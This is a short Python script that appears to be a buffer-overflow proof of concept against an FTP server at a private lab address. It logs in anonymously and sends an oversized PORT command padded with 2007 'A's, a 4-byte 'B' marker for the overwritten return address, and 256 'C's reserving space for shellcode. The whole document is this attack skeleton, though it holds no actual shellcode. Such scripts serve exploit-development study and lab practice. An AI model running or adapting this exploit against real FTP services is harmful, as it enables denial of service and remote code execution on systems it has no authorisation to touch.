#!/usr/bin/python
import sys,socket
from time import sleep
import struct
 
padding = "A" * 2007
buf = padding + "B"*4 + "C"*256
 
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.0.2.4",21))
s.recv(1024)
s.send("USER " + "Anonymous")
s.recv(1024)
s.send("PASS pass")
s.recv(1024)        
s.send("PORT " + buf)
s.recv(1024)
s.close()
